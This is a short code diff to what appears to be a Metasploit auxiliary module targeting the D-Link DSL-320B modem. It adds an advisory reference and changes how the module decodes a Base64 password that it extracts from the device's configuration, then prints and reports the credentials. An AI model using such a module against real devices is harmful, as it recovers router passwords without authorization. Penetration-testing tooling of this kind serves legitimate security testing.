@@ -23,7 +23,8 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'URL', 'http://www.dlink.com/de/de/home-solutions/connect/modems-and-gateways/dsl-320b-adsl-2-ethernet-modem' ],
 					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ],
-					[ 'EDB', '25252' ]
+					[ 'EDB', '25252' ],
+					[ 'OSVDB', '93013' ]
 				],
 			'Author'      => [
 				'Michael Messner <devnull@s3cur1ty.de>',
@@ -66,7 +67,8 @@ class Metasploit3 < Msf::Auxiliary
 					if line =~ /\<sysPassword\ value\=\"(.*)\"\/\>/
 						pass = $1
 						vprint_good("#{rhost}:#{rport} - user: #{@user}")
-						pass = Base64.decode64(pass)
+						#pass = Base64.decode64(pass)
+						pass = Rex::Text.decode_base64(pass)
 						vprint_good("#{rhost}:#{rport} - pass: #{pass}")
 
 					report_auth_info(
